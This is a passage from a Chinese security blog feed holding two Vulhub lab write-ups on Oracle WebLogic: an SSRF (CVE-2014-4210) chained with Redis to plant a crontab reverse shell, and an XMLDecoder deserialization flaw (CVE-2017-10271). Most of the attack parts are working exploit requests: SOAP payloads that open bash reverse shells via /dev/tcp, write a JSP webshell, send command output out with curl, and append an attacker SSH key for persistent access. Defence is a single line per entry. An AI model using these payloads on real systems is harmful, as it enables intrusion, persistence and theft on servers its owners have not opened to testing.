    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic SSRF（CVE-2014-4210），这个漏洞已经很老了。</p><h2 id="0x01-WebLogic-SSRF（CVE-2014-4210）"><a href="#0x01-WebLogic-SSRF（CVE-2014-4210）" class="headerlink" title="0x01 WebLogic SSRF（CVE-2014-4210）"></a>0x01 WebLogic SSRF（CVE-2014-4210）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.0.2, 10.3.6。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的SearchPublicReqistries.jsp接口存在SSRF漏洞，如果服务端或内网存在Redis未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>无需登录，可以直接访问<code>/uddiexplorer/</code>接口，其中漏洞接口如图中所指的Search Public Registries：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/1.png" alt=""></p><p>访问存活的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/2.png" alt=""></p><p>此时返回的错误信息是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &amp;#40;Not Found&amp;#41;.  Please ensure that your URL is correct, and the web service has deployed without error.</span><br></pre></td></tr></table></figure><p>访问不存在的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7000</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/3.png" alt=""></p><p>此时返回的错误信息是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &amp;#39;1&amp;#39; addresses, but could not connect over HTTP to server: &amp;#39;127.0.0.1&amp;#39;, port: &amp;#39;7000&amp;#39;</span><br></pre></td></tr></table></figure><p>根据二元组的返回结果，就可以判断目标机子的端口服务是否开放，从而进行相应的SSRF攻击。</p><p>接着结合内网存在的Redis未授权访问进行利用。</p><p>先探测内网是否存在Redis服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/4.png" alt=""></p><p>根据响应返回内容看到网络是通的，该内网IP存在Redis服务。</p><p>写入crontab计划通过bash反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &apos;bash -i &gt;&amp; /dev/tcp/172.22.0.1/6666 0&gt;&amp;1&apos;\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>对其进行URL编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure><p>放到存在SSRF的参数值URL后面，注意在前面和后面分别添加<code>%0D%0A%0D%0A</code>来实现HTTP头CRLF注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/5.png" alt=""></p><p>在Redis服务机子上成功写入crontab：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/6.png" alt=""></p><p>成功通过crontab定时任务反弹shell：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/7.png" alt=""></p><p>crontab写入Tips：</p><ul><li><code>/etc/crontab</code></li><li><code>/etc/cron.d/*</code>：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell；</li><li><code>/var/spool/cron/root</code>：CentOS系统下root用户的cron文件；</li><li><code>/var/spool/cron/crontabs/root</code>：Debian系统下root用户的cron文件；</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</title>
    <link href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/</id>
    <published>2021-04-05T14:21:19.000Z</published>
    <updated>2021-05-13T10:34:12.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）。</p><h2 id="0x01-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#0x01-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="0x01 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>0x01 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的WLS Security组件对外提供WebService服务，其中使用XMLDecoder来解析XML格式数据，其存在反序列化漏洞，从而导致RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接发送PoC报文如下，利用DNSLog外带验证（报文内容类型是SOAP型WebService报文，参考之前的WebService渗透测试文章来构造即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;ping weblogic.16qkmh.dnslog.cn&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>DNSLog看到请求记录：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/1.png" alt=""></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="直接反弹shell"><a href="#直接反弹shell" class="headerlink" title="直接反弹shell"></a>直接反弹shell</h4><p>反弹shell的Exp报文，将PoC中填入命令的那一行修改下即可（其实特殊符号无需编码也可以）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.0.2/21 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exploit-db中的Exp脚本，直接用于反弹shell：<a href="https://www.exploit-db.com/exploits/43458/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43458/</a></p><p>但是在Vulhub的环境用不了，因为其Linux反弹shell的Exp用的Python，但目标环境没，这里改成用bash反弹shell即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># self.cmd_payload = (</span></span><br><span class="line"><span class="comment">#     "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."</span></span><br><span class="line"><span class="comment">#     "SOCK_STREAM);s.connect((\"&#123;lhost&#125;\",&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2("</span></span><br><span class="line"><span class="comment">#     "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span></span><br><span class="line"><span class="comment"># ).format(lhost=self.lhost, lport=self.lport)</span></span><br><span class="line">self.cmd_payload = (</span><br><span class="line">    <span class="string">"bash -i &gt;&amp; /dev/tcp/&#123;lhost&#125;/&#123;lport&#125; 0&gt;&amp;1"</span></span><br><span class="line">    ).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure><p>还有个点就是换成<code>/bin/bash</code>而非<code>/bin/sh</code>，改了之后就可以OK了：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/2.png" alt=""></p><h4 id="写WebShell"><a href="#写WebShell" class="headerlink" title="写WebShell"></a>写WebShell</h4><p>写入WebShell的Exp报文，看报文内容即可，换了java.io.PrintWriter类进行操作，其中WebShell文件时写入到了<code>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</code>中，其通过<code>http://ip:7001/bea_wls_internal/test.jsp</code>访问得到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/3.png" alt=""></p><p>期间可以通过HTTP OOB来外带看看是否创建成功（服务端使用<code>nc -lvnp 6666</code>监听即可）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>curl http://x.x.x.x:6666/x -d "x=`ls servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war`"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/4.png" alt=""></p><p>最后访问即可<code>/bea_wls_internal/test.jsp</code>：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/5.png" alt=""></p><h4 id="写SSH-Key"><a href="#写SSH-Key" class="headerlink" title="写SSH Key"></a>写SSH Key</h4><p>修改前面HTTP OOB外带查询当前用户的名称：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>curl http://x.x.x.x:6666/x -d "x=`whoami`"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后探测是否存在.ssh目录和authorized_keys文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=`ls -l /home/xxx/.ssh`</span><br></pre></td></tr></table></figure><p>如果不存在则需要先创建，之后进行写SSH Key，使用追加的方式，不覆盖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgsrQRaSsoX1tEv0+xqWFaWrFt5RA+ZnaevW9Fh2y8RACQ1h++EpFyD0HqsQD5Gfz6bEzis9KbZaytyketcPOe7XB2Qd0r+kSPu7k1iycTj0A59/mbMwDH42WJd27aeTmyJCAyQl8E6zIVaTZw137I4jVcyOruSFHxjeOvH5gaut2s6AZyCxJx5DpVHt6Sbj2FHPVDtOZ/Dxv1cyhCaybBfX0U88T8xrIwX5KIMmd2cj2lJsVHXxHk255lBgGL1n1oWXgllOIDfg3HJFxzualjf+NzKmhg8B+4GSfGSY8KEK/pCeiaDIYcB2tVk3sUDUw5gEUEpGJWxQlAGClEQ29DvBjRT/6hESz4nYUKlOI4CfdCwlX6NDM8JHttZqdORrzXoOMeu1Nc4IBO4jNMfzBHecbWkPb+W2kyouwfe2yAToA10G6IdllUq9HzTlcqLe+XW11i8P0FVvbv7GKeEfnFxd/NY51H7E15P7O65DIxvjBQeKlnMOLTOy2+xPfIIRs=" &gt;&gt; /home/xxx/.ssh/authorized_keys<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看是否成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=`cat /home/xxx/.ssh/authorized_keys`</span><br></pre></td></tr></table></figure><p>写入成功后就能直接SSH登录了：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/6.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：</p><p><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">https://paper.seebug.org/487/</a></p><p><a href="https://bl4ck.in/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://bl4ck.in/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级WebLogic版本；</li><li>删除WLS-WebServices组件；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic T3反序列化漏洞（CVE-2018-2628）</title>
    <link href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/</id>
    <published>2021-04-05T10:32:07.000Z</published>
    <updated>2021-04-05T14:17:01.294Z</updated>
    
